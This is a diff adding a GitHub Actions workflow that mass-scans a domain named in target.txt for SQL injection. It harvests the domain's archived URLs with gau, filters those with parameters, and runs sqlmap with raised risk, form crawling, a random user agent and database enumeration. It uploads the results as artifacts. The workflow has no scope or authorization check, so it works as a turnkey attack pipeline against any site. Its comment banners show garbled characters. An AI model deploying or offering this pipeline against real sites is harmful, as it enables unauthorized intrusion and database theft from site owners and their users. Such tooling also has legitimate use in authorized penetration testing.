@@ -1,0 +1,132 @@
+name: SQLMap Automated Scan Pipeline
+
+on:
+  workflow_dispatch:        # Manual trigger from Actions tab
+  push:
+    paths:
+      - 'target.txt'        # Auto-trigger when target.txt is updated
+
+jobs:
+  sqli-scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+
+    steps:
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 1. Checkout repo (contains target.txt)
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 2. Read target domain from target.txt
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Read target domain
+        id: target
+        run: |
+          DOMAIN=$(cat target.txt | tr -d '[:space:]')
+          echo "domain=$DOMAIN" >> $GITHUB_OUTPUT
+          echo "[*] Target domain: $DOMAIN"
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 3. Install Go (required for gau)
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Set up Go
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 4. Install tools
+      #    gau     â†’ collect URLs from Wayback + CommonCrawl
+      #    uro     â†’ deduplicate and normalise param URLs
+      #    sqlmap  â†’ SQL injection scanner
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Install gau
+        run: go install github.com/lc/gau/v2/cmd/gau@latest
+
+      - name: Install uro (URL deduplicator)
+        run: pip install uro --quiet
+
+      - name: Install sqlmap
+        run: |
+          sudo apt-get install -y sqlmap
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 5. Collect ALL URLs for the target domain
+      #    using gau (Wayback Machine + CommonCrawl)
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Collect URLs with gau
+        run: |
+          DOMAIN="${{ steps.target.outputs.domain }}"
+          echo "[*] Running gau on: $DOMAIN"
+
+          gau \
+            --threads 5 \
+            --retries 3 \
+            --timeout 30 \
+            --blacklist png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,eot,css,js,pdf,zip \
+            "$DOMAIN" > all_urls.txt
+
+          echo "[*] Total URLs collected: $(wc -l < all_urls.txt)"
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 6. Filter URLs that have query parameters
+      #    These are the ones SQLMap needs
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Filter parameterized URLs
+        run: |
+          # Keep only URLs that have at least one ?param=value
+          grep '=' all_urls.txt | grep '?' > param_urls_raw.txt || true
+
+          # Remove duplicates and normalise with uro
+          cat param_urls_raw.txt | uro > param_urls.txt || cp param_urls_raw.txt param_urls.txt
+
+          COUNT=$(wc -l < param_urls.txt)
+          echo "[*] Parameterized URLs found: $COUNT"
+
+          if [ "$COUNT" -eq 0 ]; then
+            echo "[!] No parameterized URLs found. Exiting."
+            exit 1
+          fi
+
+          echo "[*] Sample URLs:"
+          head -10 param_urls.txt
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 7. Run SQLMap against all parameterized URLs
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Run SQLMap
+        run: |
+          mkdir -p sqlmap_output
+
+          sqlmap \
+            --url-file=param_urls.txt \
+            --batch \
+            --random-agent \
+            --level=3 \
+            --risk=2 \
+            --timeout=10 \
+            --retries=2 \
+            --threads=5 \
+            --dbs \
+            --output-dir=sqlmap_output \
+            --forms \
+            --crawl=2 \
+            --smart \
+            2>&1 | tee sqlmap_output/sqlmap_full_log.txt
+
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      # 8. Upload all results as artifact
+      # â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      - name: Upload scan results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sqlmap-results-${{ steps.target.outputs.domain }}
+          path: |
+            sqlmap_output/
+            param_urls.txt
+            all_urls.txt
+          retention-days: 14
